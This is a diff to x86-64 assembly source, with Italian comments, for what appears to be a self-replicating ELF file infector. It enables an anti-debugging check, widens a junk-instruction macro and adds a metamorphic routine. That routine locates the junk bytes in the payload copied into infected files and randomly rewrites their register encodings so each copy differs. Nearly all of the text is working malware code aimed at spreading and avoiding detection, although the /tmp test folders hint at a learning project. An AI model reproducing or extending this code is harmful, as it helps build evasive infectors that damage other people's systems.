@@ -23,6 +23,8 @@
 
 %define START_JUNK1 0x41
 %define START_JUNK2 0x57
+%define START_JUNK3 0x41
+%define START_JUNK4 0x56
 %define PUSH 0x50
 %define ADD 0x83
 %define ADD1 0xc0
@@ -34,10 +36,12 @@
 %define XCHG1 0xc0
 %define POP 0x58
 %define END_JUNK1 0x41
-%define END_JUNK2 0x5f
+%define END_JUNK2 0x5e
+%define END_JUNK3 0x41
+%define END_JUNK4 0x5f
 
 %macro JUNK 0
-    db START_JUNK1, START_JUNK2, PUSH, ADD, ADD1, ADD2, SUB, SUB1, SUB2, XCHG, XCHG1, POP, END_JUNK1, END_JUNK2
+    db START_JUNK1, START_JUNK2, START_JUNK3, START_JUNK4, PUSH, ADD, ADD1, ADD2, SUB, SUB1, SUB2, XCHG, XCHG1, POP, END_JUNK1, END_JUNK2, END_JUNK3, END_JUNK4,
 %endmacro
 
 section .text
@@ -85,21 +89,25 @@ _start:
 
     ; ----------------------- Anti-Debug -----------------------
     JUNK
-;    call check_debug
-;    cmp rax, 0
-;    je .pass_first_check
-;
-;    JUNK
-;
-;    mov rdi, 1
-;    lea rsi, [rel msg_debug]
-;    mov rdx, 12
-;    mov rax, 1
-;    syscall                                ; write(1, "DEBUGGING..\n", 12)
-;
-;    JUNK
-;
-;    jmp exit
+    JUNK
+
+    call check_debug
+    cmp rax, 0
+    je .pass_first_check
+
+    JUNK
+    JUNK
+
+    mov rdi, 1
+    lea rsi, [rel msg_debug]
+    mov rdx, 12
+    mov rax, 1
+    syscall                                ; write(1, "DEBUGGING..\n", 12)
+
+    JUNK
+    JUNK
+
+    jmp exit
 
     .pass_first_check:
     ; --------- Controllo se il processo cat è attivo ----------
@@ -110,6 +118,7 @@ _start:
     ; ----------------------------------------------------------
 
     JUNK
+    JUNK
 
     .pass_second_check:
     sub rsp, 16                             ; riservo spazio per /tmp/test
@@ -117,6 +126,7 @@ _start:
     mov dword [rsp+4], '/tes'
     mov dword [rsp], '/tmp'
 
+    JUNK
     JUNK
 
     sub rsp, 16                             ; riservo spazio per /tmp/test2
@@ -131,6 +141,7 @@ _start:
     jl exit
 
     JUNK
+    JUNK
 
     mov rsi, 0
     call open                               ; open /tmp/test/
@@ -138,6 +149,7 @@ _start:
     jl exit
     push rax                                ; salvo nello stack fd cartella
 
+    JUNK
     JUNK
 
     sub rsp, 32768                          ; riservo spazio nello stack per lettura getdents64
@@ -147,10 +159,12 @@ _start:
     push rax                                ; salvo nello stack totale letto da getdents64
 
     JUNK
+    JUNK
 
     mov rdi, [rsp+32768+8]
     call closefd                            ; chiudo fd cartella
 
+    JUNK
     JUNK
 
     sub rsp, 4096                           ; riservo spazio per stat
@@ -159,6 +173,7 @@ _start:
     add rdi, 4104                           ; rdi = puntatore struct
     call loop_indir
 
+    JUNK
     JUNK
 
     ;test2
@@ -169,6 +184,7 @@ _start:
     jl exit
 
     JUNK
+    JUNK
 
     mov rsi, 0
     call open                               ; open
@@ -177,6 +193,7 @@ _start:
     mov [rsp+4096+8+32768], rax             ; salvo fd
 
     JUNK
+    JUNK
 
     mov rdi, [rsp+4096+8+32768]             ; rdi = fd
     mov rsi, rsp
@@ -184,6 +201,7 @@ _start:
     call getdents64                         ; getdents64
     mov [rsp+4096], rax                     ; salvo quantità letta
 
+    JUNK
     JUNK
 
     mov rdi, [rsp+4096+8+32768]             ; fd da chiudere
@@ -194,6 +212,7 @@ _start:
     add rdi, 4104                           ; rdi = dati letti da getdents64
     call loop_indir
 
+    JUNK
     JUNK
 
     jmp exit
@@ -427,14 +446,79 @@ infect_file:                                ; rdi = ptr nome file
         lea rsi, [rel _start]
         sub rcx, rsi
         sub rax, rcx                        ; sottraggo al puntatore la dimensione del payload
+        sub rax, 5                          ; sottraggo al puntatore la dimensione del jmp
+        mov r8, rax                         ; r8 = *map
+        ;add rcx, 5
+        mov r9, rcx                         ; r9 = tot da analizzare
 
-        mov rsi, [rax]
-        mov rax, 1
-        mov rdi, 1
-        mov rdx, 6
-        syscall
+        mov r10, -1                         ; r10 = contatore
+        .meta_loop:
+            add r10, 1
+            xor rdi, rdi
+            mov edi, dword [r8+r10]
+            cmp edi, 0x56415741
+            jne .continue
+            .check_add:
+                cmp byte [r8+r10+5], 0x83
+                jne .continue
+            .check_sub:
+                cmp byte [r8+r10+8], 0x83
+                jne .continue
+            .check_xchg:
+                cmp byte [r8+r10+11], 0x87
+                je .meta
+            .continue:
+                cmp r10, r9
+                jl .meta_loop
+                jge .meta_end
 
-        jmp .end
+        .meta:
+            sub rsp, 1
+            .rand:
+                mov rdi, rsp
+                mov rsi, 1
+                mov rdx, 0
+                mov rax, 318                ; getrandom(rsp, 1, 0)
+                syscall
+
+                mov al, [rsp]
+                xor rsi, rsi
+                mov si, 8
+                div si
+                cmp dl, 4
+                je .rand
+                cmp dl, 5
+                je .rand
+                                            ; (rdx)dl = [0...7] tranne 4 o 5
+            add rsp, 1
+
+            xor rdi, rdi
+            mov dil, 0x50
+            add dil, dl
+            mov byte [r8+r10+4], dil        ; modifico PUSH 0x50 + dl
+
+            xor rdi, rdi
+            mov dil, 0xc0
+            add dil, dl
+            mov byte [r8+r10+6], dil        ; modifico ADD1 0xc0 + dl
+
+            add dil, 0x28
+            mov byte [r8+r10+9], dil        ; modifico SUB1 0xc0 + 0x28 + dl
+
+            sub dil, 0x28
+            mov byte [r8+r10+12], dil        ; modifico XCHG1 0xc0 + dl
+
+            xor rdi, rdi
+            mov dil, 0x58
+            add dil, dl
+            mov byte [r8+r10+13], dil        ; modifico POP 0x58 + dl
+
+            jmp .meta_loop
+
+            .meta_end:
+                xor r9, r9
+                xor r10, r10
+                jmp .end
 
 msg_debug:
     db 'DEBUGGING..', 0xA, 0x00
